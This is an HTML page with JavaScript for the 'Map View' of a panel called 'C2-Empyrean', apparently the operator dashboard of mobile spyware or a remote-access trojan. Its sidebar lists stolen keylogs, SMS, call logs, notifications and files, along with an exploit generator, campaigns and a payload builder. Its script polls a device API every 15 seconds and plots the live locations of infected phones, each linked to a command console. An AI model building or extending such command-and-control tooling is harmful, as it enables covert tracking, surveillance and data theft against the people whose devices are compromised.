<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Map View - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }
        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 999;
        }
        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
            height: 100vh;
            display: flex;
            flex-direction: column;
        }
        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; flex-shrink: 0; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }
        .header-actions { display: flex; gap: 12px; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px;
            cursor: pointer; transition: all 0.2s;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }

        .map-container {
            flex: 1;
            border-radius: 16px;
            overflow: hidden;
            border: 1px solid rgba(255, 255, 255, 0.06);
            position: relative;
            min-height: 400px;
        }
        #map {
            width: 100%;
            height: 100%;
            min-height: 400px;
        }

        .map-overlay {
            position: absolute;
            top: 16px;
            right: 16px;
            z-index: 1000;
            background: rgba(10, 10, 15, 0.9);
            border: 1px solid rgba(255, 255, 255, 0.08);
            border-radius: 12px;
            padding: 14px;
            min-width: 220px;
            backdrop-filter: blur(12px);
        }
        .map-overlay .stat { font-size: 13px; padding: 4px 0; display: flex; justify-content: space-between; }
        .map-overlay .stat .label { color: rgba(255, 255, 255, 0.4); }
        .map-overlay .stat .value { color: #fff; font-weight: 600; }
        .map-overlay .stat.online .value { color: #34c759; }

        .device-popup { font-size: 13px; min-width: 200px; }
        .device-popup .popup-id { font-family: monospace; color: #7b2ff7; font-weight: 600; }
        .device-popup .popup-info { color: rgba(0,0,0,0.6); font-size: 12px; margin-top: 4px; }
        .device-popup .popup-actions { margin-top: 8px; display: flex; gap: 6px; }
        .device-popup .popup-actions a {
            padding: 4px 10px; font-size: 11px; border-radius: 4px;
            background: #7b2ff7; color: #fff; text-decoration: none;
        }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; max-width: 100%; padding: 16px; }
            .map-overlay { position: relative; top: auto; right: auto; margin-bottom: 12px; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">
            <div class="sidebar-logo">C2-Empyrean</div>
            <div class="sidebar-section-title">Main</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/dashboard"><span class="icon">📊</span> Dashboard</a></li>
                <li><a href="/admin/devices"><span class="icon">📱</span> Devices</a></li>
                <li><a href="/admin/map_view" class="active"><span class="icon">🗺️</span> Map View</a></li>
                <li><a href="/admin/command_console"><span class="icon">⚡</span> Command Console</a></li>
                <li><a href="/admin/analytics"><span class="icon">📈</span> Analytics</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Data</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/keylog_viewer"><span class="icon">⌨️</span> Keylogs</a></li>
                <li><a href="/admin/sms_console"><span class="icon">💬</span> SMS</a></li>
                <li><a href="/admin/call_logs"><span class="icon">📞</span> Call Logs</a></li>
                <li><a href="/admin/notification_viewer"><span class="icon">🔔</span> Notifications</a></li>
                <li><a href="/admin/file_browser"><span class="icon">📁</span> Files</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Actions</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/exploit_generator"><span class="icon">🎣</span> Exploit Generator</a></li>
                <li><a href="/admin/campaign_manager"><span class="icon">📢</span> Campaigns</a></li>
                <li><a href="/admin/builder"><span class="icon">🔧</span> Builder</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">System</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/settings"><span class="icon">⚙️</span> Settings</a></li>
                <li><a href="/admin/telegram_settings"><span class="icon">🤖</span> Telegram</a></li>
            </ul>
        </nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">🗺️ Map View <span>geolocation tracking</span></h1>
                <div class="header-actions">
                    <button class="header-btn" onclick="refreshMarkers()">🔄 Refresh</button>
                    <button class="header-btn" onclick="fitAll()">🌍 Fit All</button>
                </div>
            </div>

            <div class="map-container">
                <div id="map"></div>
                <div class="map-overlay">
                    <div class="stat"><span class="label">Devices on map</span><span class="value" id="statTotal">0</span></div>
                    <div class="stat online"><span class="label">Online now</span><span class="value" id="statOnline">0</span></div>
                    <div class="stat"><span class="label">Last update</span><span class="value" id="statUpdated">—</span></div>
                </div>
            </div>
        </main>
    </div>

    <script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
    <script>
        let map;
        let markers = [];
        let refreshInterval;

        document.addEventListener('DOMContentLoaded', function() {
            map = L.map('map', {
                center: [20, 0],
                zoom: 2,
                zoomControl: true,
                attributionControl: false
            });

            L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
                maxZoom: 19
            }).addTo(map);

            refreshMarkers();
            refreshInterval = setInterval(refreshMarkers, 15000);
        });

        async function refreshMarkers() {
            try {
                const response = await fetch('/api/devices/list?page=1&per_page=500&has_location=1', {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) {
                    if (result.code === 401) { window.location.href = '/admin/login'; return; }
                    return;
                }

                const devices = result.data.devices || [];
                clearMarkers();

                let onlineCount = 0;
                devices.forEach(d => {
                    const loc = d.last_location;
                    if (!loc || !loc.lat || !loc.lng) return;
                    if (d.is_online) onlineCount++;

                    const color = d.is_online ? '#34c759' : '#ff453a';
                    const icon = L.divIcon({
                        html: `<div style="width:16px;height:16px;background:${color};border:3px solid ${color === '#34c759' ? 'rgba(52,199,89,0.4)' : 'rgba(255,69,58,0.4)'};border-radius:50%;box-shadow:0 0 12px ${color}40;"></div>`,
                        iconSize: [16, 16],
                        iconAnchor: [8, 8],
                        className: ''
                    });

                    const marker = L.marker([loc.lat, loc.lng], { icon }).addTo(map);
                    marker.bindPopup(`
                        <div class="device-popup">
                            <div class="popup-id">${d.device_id}</div>
                            <div class="popup-info">${d.model || '—'} · ${d.country || '—'}</div>
                            <div class="popup-info">${d.is_online ? '🟢 Online' : '🔴 Offline'} · ${d.battery_level || '?'}%</div>
                            <div class="popup-info">Last: ${timeAgo(d.last_seen)}</div>
                            <div class="popup-actions">
                                <a href="/admin/device_detail?id=${d.device_id}">Details</a>
                                <a href="/admin/command_console?device=${d.device_id}">Console</a>
                            </div>
                        </div>
                    `);
                    markers.push(marker);
                });

                document.getElementById('statTotal').textContent = devices.length;
                document.getElementById('statOnline').textContent = onlineCount;
                document.getElementById('statUpdated').textContent = new Date().toLocaleTimeString();

            } catch (err) {
                console.error('Map refresh error:', err);
            }
        }

        function clearMarkers() {
            markers.forEach(m => map.removeLayer(m));
            markers = [];
        }

        function fitAll() {
            if (markers.length === 0) return;
            const group = L.featureGroup(markers);
            map.fitBounds(group.getBounds().pad(0.1));
        }

        function timeAgo(ts) {
            if (!ts) return 'never';
            const s = Math.floor(Date.now() / 1000 - ts);
            if (s < 60) return 'just now';
            if (s < 3600) return Math.floor(s / 60) + 'm ago';
            if (s < 86400) return Math.floor(s / 3600) + 'h ago';
            return Math.floor(s / 86400) + 'd ago';
        }

        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
